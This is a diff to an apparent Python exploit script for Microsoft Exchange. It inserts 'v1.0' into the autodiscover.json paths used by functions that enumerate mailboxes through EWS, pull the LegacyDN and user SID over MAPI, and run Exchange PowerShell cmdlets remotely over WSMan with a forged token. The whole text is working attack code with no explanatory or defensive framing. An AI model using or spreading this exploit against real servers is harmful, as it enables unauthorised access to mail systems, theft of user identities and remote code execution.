@@ -52,7 +52,7 @@ def getToken(uname, sid):
 def getMail(target):
     eb_headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
-        "Cookie": "email=autodiscover/autodiscover.json/@gmail.com",
+        "Cookie": "email=autodiscover/autodiscover.json/v1.0/@gmail.com",
         "Content-Type": "text/xml",
     }
     ews_data = """<?xml version="1.0" encoding="utf-8"?>
@@ -68,7 +68,7 @@ def getMail(target):
             </m:ResolveNames>
         </soap:Body>
     </soap:Envelope>"""
-    resb = req.post(url=f"{target}/autodiscover/autodiscover.json/@gmail.com/ews/exchange.asmx", headers=eb_headers, data=ews_data, verify=False)
+    resb = req.post(url=f"{target}/autodiscover/autodiscover.json/v1.0/@gmail.com/ews/exchange.asmx", headers=eb_headers, data=ews_data, verify=False)
     email_list = re.findall("(?:<t:EmailAddress>)(.+?)(?:</t:EmailAddress>)", resb.text)
     return email_list
 
@@ -105,10 +105,10 @@ def exploit(target):
         </Autodiscover>"""
         ec_headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
-            "Cookie": "email=autodiscover.json/@gmail.com",
+            "Cookie": "email=autodiscover.json/v1.0/@gmail.com",
             "Content-Type": "text/xml",
         }
-        resc = req.post(url=f"{target}/autodiscover/autodiscover.json/@gmail.com/autodiscover.xml", headers=ec_headers, data=autodiscover_data, verify=False)
+        resc = req.post(url=f"{target}/autodiscover/autodiscover.json/v1.0/@gmail.com/autodiscover.xml", headers=ec_headers, data=autodiscover_data, verify=False)
         if f"DisplayName" in resc.text:
             legacydn = re.findall("(?:<LegacyDN>)(.+?)(?:</LegacyDN>)", resc.text)
             print(f"[+] LegacyDN: {legacydn}")
@@ -118,7 +118,7 @@ def exploit(target):
 
         ed_headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
-            "Cookie": "email=autodiscover/autodiscover.json/@gmail.com",
+            "Cookie": "email=autodiscover/autodiscover.json/v1.0/@gmail.com",
             "X-Requesttype": "Connect",
             "X-Requestid": "{E2EA6C1C-E61B-49E9-9CFB-38184F907552}:123456",
             "X-Clientinfo": "{2EF33C39-49C8-421C-B876-CDF7F2AC3AA0}:123",
@@ -126,7 +126,7 @@ def exploit(target):
             "Content-Type": "application/mapi-http",
         }
         mapi_data = f"{legacydn[0]}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
-        resd = req.post(url=f"{target}/autodiscover/autodiscover.json/@gmail.com/mapi/emsmdb?MailboxId=gmail.com", headers=ed_headers, data=mapi_data, verify=False)
+        resd = req.post(url=f"{target}/autodiscover/autodiscover.json/v1.0/@gmail.com/mapi/emsmdb?MailboxId=gmail.com", headers=ed_headers, data=mapi_data, verify=False)
         try:
             sid = resd.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
             print(f"[+] Origin SID: {sid}")
@@ -150,7 +150,7 @@ def exploit(target):
 def execmdlet(server, token, **kwargs):
     wsman = WSMan(
         server=server, port=443, cert_validation=False,
-        path=f"/autodiscover/autodiscover.json/@gmail.com/powershell?email=autodiscover/autodiscover.json/@gmail.com&X-Rps-CAT={token}"
+        path=f"/autodiscover/autodiscover.json/v1.0/@gmail.com/powershell?email=autodiscover/autodiscover.json/v1.0/@gmail.com&X-Rps-CAT={token}"
     )
     with wsman, RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
         ps = PowerShell(pool)
